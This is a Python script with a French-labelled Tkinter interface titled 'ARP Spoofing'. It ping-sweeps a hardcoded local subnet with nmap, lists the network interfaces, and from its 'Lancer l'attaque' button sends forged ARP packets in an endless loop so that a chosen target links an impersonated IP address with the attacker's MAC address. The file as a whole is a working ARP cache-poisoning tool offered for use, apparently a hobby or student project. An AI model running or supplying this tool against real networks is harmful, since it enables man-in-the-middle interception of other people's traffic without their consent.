import tkinter as tk
from tkinter import messagebox
import nmap
import netifaces
from scapy.all import *
import time


def get_interface_info():
    info = []
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        if interface == "lo":
            continue
        addresses = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addresses:
            address_info = addresses[netifaces.AF_INET][0]
            ip_address = address_info['addr']
            netmask = address_info['netmask']
            info += [[interface , ip_address , netmask]]
    return info

info = get_interface_info
def scan():
    liste = []
    nm = nmap.PortScanner()
    nm.scan(hosts='192.168.1.62/24', arguments='-sP')
    for host in nm.all_hosts():
        liste.append(str(host)  +' '+  str(nm[host].hostname()))
    return liste

def get_mac_address():
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "00:00:00:00:00:00"):
            return mac


def attack():
    my_mac = get_mac_address()
    packet = Ether()/ARP(op="who-has", hwsrc=my_mac, psrc=ip_1.get(), pdst=ip_2.get())
    while True:
        time.sleep(0.2)
        sendp(packet, loop=1, inter=0.2)

liste = []
fenetre = tk.Tk()
fenetre.title("ARP Spoofing")

label_0 = tk.Label(fenetre, text="Adresse IP à imiter :")
label_0.grid(row=0, column=0, padx=10, pady=5)

liste_ip_1 = tk.Listbox(fenetre, selectmode=tk.SINGLE)
for ip in liste:
    liste_ip_1.insert(tk.END, ip)
liste_ip_1.grid(row=0, column=0, padx=10, pady=5)


label_1 = tk.Label(fenetre, text="IP à imiter :")
label_1.grid(row=0, column=5, padx=10, pady=5)

ip_1 = tk.Entry(fenetre)
ip_1.grid(row=0, column=6, padx=1, pady=5)

label_2 = tk.Label(fenetre, text="IP à attaquer :")
label_2.grid(row=1, column=6, padx=10, pady=5)
ip_2 = tk.Entry(fenetre)
ip_2.grid(row=1, column=7, padx=10, pady=5)

bouton_lancer = tk.Button(fenetre, text="Lancer l'attaque", command=attack)
bouton_lancer.grid(row=2, columnspan=2, padx=10, pady=10)
listeif=get_interface_info()
liste_if = tk.Listbox(fenetre, selectmode=tk.SINGLE)
for inf in listeif:
    liste_if.insert(tk.END, inf)
liste_if.grid(row=3, column=0, padx=10, pady=5)

button_scan = tk.Button(fenetre, text="Lancer le scan", command=scan)
button_scan.grid(row=5, column=0, columnspan=2, padx=10, pady=10)

fenetre.mainloop()
